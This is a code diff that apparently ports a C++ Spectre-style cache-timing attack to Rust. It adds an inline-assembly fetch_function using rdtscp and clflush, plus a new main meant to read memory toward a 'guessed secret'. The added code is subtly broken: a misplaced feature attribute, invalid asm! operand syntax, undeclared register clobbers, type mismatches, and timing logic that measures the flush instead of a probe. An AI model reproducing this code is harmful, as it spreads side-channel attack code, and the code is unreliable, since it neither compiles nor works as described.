@@ -69,16 +69,63 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, attack_pattern: Vec<u8>
     secret
 }
 
-fn fetch_function(idx: usize) -> i32 {
-    // Should simulate the behavior of the C++ `fetch_function`
-    // by returning values from the shared memory, based on the `idx`.
-    // It should also incorporate the cache access time measurement logic.
-    // This part requires low-level control and may involve inline assembly.
-    // Unfortunately, implementing this in Rust is not fun :(
+#![feature(asm)]
 
-    // Placeholder code
-    0
+fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
+    // This function simulates the behavior of the C++ `fetch_function`.
+    // It returns values from the shared memory, based on the `idx`.
+
+    let mut value: i32 = -1;
+
+    if idx < arr1.len() {
+        // Ensure the index is within bounds of arr1_size
+        let arr1_idx = arr1[idx] as usize;
+        if arr1_idx < arr2.len() / 512 {
+            // Calculate the index for arr2 based on arr1
+            let arr2_idx = arr1_idx * 512;
+            
+            // Simulate cache access time measurement (you may need to adjust this)
+            let mut time1: u64;
+            let mut time2: u64;
+            let junk: u64 = 0;
+            
+            unsafe {
+                asm!(
+                    "lfence",
+                    "rdtscp",
+                    "mov {}, rax",
+                    "clflush [{}]",
+                    "rdtscp",
+                    "mov {}, rax",
+                    "lfence",
+                    out(reg) time1 => _,
+                    in(reg) arr2_idx => _,
+                    out(reg) junk => _,
+                    out(reg) time2 => _,
+                );
+            }
+            
+            if time2 - time1 <= CACHE_HIT_THRESHOLD {
+                // Cache hit, update the value
+                value = arr2[arr2_idx];
+            }
+        }
+    }
+
+    value
 }
+
+fn main() {
+    // Set up shared memory for arr1 and arr2, as in the C++ code.
+    let arr1 = [16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186];
+    let arr2 = [0; 256 * 512]; // Placeholder, initialize with appropriate values
+    
+    let idx = 5; // Replace with the index you want to access
+    let value = fetch_function(&arr1, &arr2, idx);
+
+    println!("Fetched Value: {}", value);
+}
+/* 
 
 fn main() {
     // Need to set up shared memory for arr1 and arr2, as in the C++ code.
@@ -91,3 +138,4 @@ fn main() {
 
     println!("THE GUESSED SECRET IS :: {}", guessed_secret);
 }
+*/
